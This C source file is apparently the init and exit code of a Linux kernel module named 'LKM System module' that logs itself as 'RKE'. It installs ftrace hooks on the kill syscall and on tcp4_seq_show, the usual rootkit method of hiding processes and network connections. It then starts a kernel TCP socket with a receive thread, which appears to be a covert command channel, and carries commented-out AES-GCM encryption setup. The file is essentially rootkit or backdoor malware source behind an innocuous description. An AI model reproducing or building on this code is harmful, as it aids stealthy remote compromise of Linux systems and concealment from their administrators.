#include <linux/crypto.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/sched.h>
#include <linux/socket.h>

#include "../include/common.h"
#include "../include/connector/tcp.h"
#include "../include/crypto/cipher.h"
#include "../include/hooks/ftrace_helper.h"
#include "../include/hooks/hooks.h"

static struct aes_gcm_ctx *ctx;
struct socket *sock = NULL;
struct task_struct *thread = NULL;

MODULE_LICENSE("GPL");
MODULE_AUTHOR("voidbyte, oromos");
MODULE_DESCRIPTION("LKM System module");

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("tcp4_seq_show", hook_tcp4, &orig_tcp4_seq_show),
};

static void print_buffer(const char *label, const u8 *buf, size_t len) {
  size_t i;
  pr_info("%s: ", label);
  for (i = 0; i < len; i++) {
    pr_cont("%02x ", buf[i]);
  }
  pr_cont("\n");
}

static int __init lkm_init(void) {
  int ret;
  printk(KERN_INFO "RKE loaded\n");

  // ctx = kzalloc(sizeof(*ctx), GFP_KERNEL);
  // if (!ctx) {
  //   printk(KERN_ERR "RKE: Failed to allocate memory for ctx\n");
  //   return -ENOMEM;
  // }

  // ret = init_ctx(ctx);
  // if (ret) {
  //   printk(KERN_ERR "RKE: Failed to initialize AES-GCM context\n");
  //   kfree(ctx);
  //   return ret;
  // }

  // u8 plaintext[] = "ebe ebe";
  // u8 ciphertext[128] = {0};
  // u8 decrypted[128] = {0};
  // size_t len = strlen(plaintext);

  // printk("Plaintext: %s", plaintext);

  // ret = encrypt(ctx, plaintext, ciphertext, len);
  // if (ret) {
  //   printk(KERN_ERR "RKE: Encryption failed\n");
  //   goto cleanup;
  // }

  // print_buffer("Ciphertext", ciphertext, len + AES_GCM_TAG_SIZE);

  // ret = decrypt(ctx, decrypted, ciphertext, len + AES_GCM_TAG_SIZE);
  // if (ret) {
  //   printk(KERN_ERR "RKE: Decryption failed\n");
  //   goto cleanup;
  // }

  // printk("Decrypted: %s\n", decrypted);

  ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (ret)
    return ret;

  ret = socket_init(&sock, &thread);
  if (ret < 0) {
    printk(KERN_INFO "socket_init failed\n");
    return ret;
  }

  return 0;
cleanup:
  cleanup_crypto_ctx(ctx);
  return ret;
}

static void __exit lkm_exit(void) {
  printk(KERN_INFO "RKE unloading\n");
  // cleanup_crypto_ctx(ctx);

  // if (gcm_tfm) {
  //   crypto_free_aead(gcm_tfm);
  //   gcm_tfm = NULL;
  //   printk(KERN_INFO "Cleaned up AEAD transform\n");
  // }

  // cleanup(gcm_tfm, NULL, NULL);
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

  if (thread) {
    int ret = kthread_stop(thread);
    if (ret != -EINTR) {
      printk(KERN_INFO "tcp_recv thread has stopped\n");
    }
    thread = NULL;
  }

  if (sock) {
    if (sock->sk && sock->sk->sk_state == TCP_ESTABLISHED) {
      printk(KERN_INFO "Closing socket connection\n");
      if (sock->ops)
        sock->ops->shutdown(sock, SHUT_RDWR);
      else
        printk(KERN_WARNING "sock->ops is NULL\n");
    }
    sock_release(sock);
    sock = NULL;
    printk(KERN_INFO "Socket released successfully\n");
  }
}

module_init(lkm_init);
module_exit(lkm_exit);
